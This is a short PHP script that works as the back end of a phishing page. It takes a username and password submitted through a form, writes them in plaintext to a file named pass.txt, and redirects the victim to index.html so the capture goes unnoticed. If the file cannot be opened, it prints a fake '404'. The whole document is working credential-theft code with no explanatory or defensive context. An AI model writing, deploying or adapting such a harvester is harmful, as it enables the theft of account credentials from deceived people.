<?php

if (isset($_POST['username']) && isset($_POST['password'])) {

    $user = $_POST['username'];
    $pass = $_POST['password'];

    $user = htmlspecialchars($user);
    $pass = htmlspecialchars($pass);

    $file = 'pass.txt';
    
    $handle = fopen($file, 'a');
    
    if ($handle) {
        $data = "Username: $user\nPassword: $pass\n-------------------\n";
        fwrite($handle, $data);
        fclose($handle);

        header("Location: index.html");
        exit();
    } else {
        echo "404";
    }
}

?>
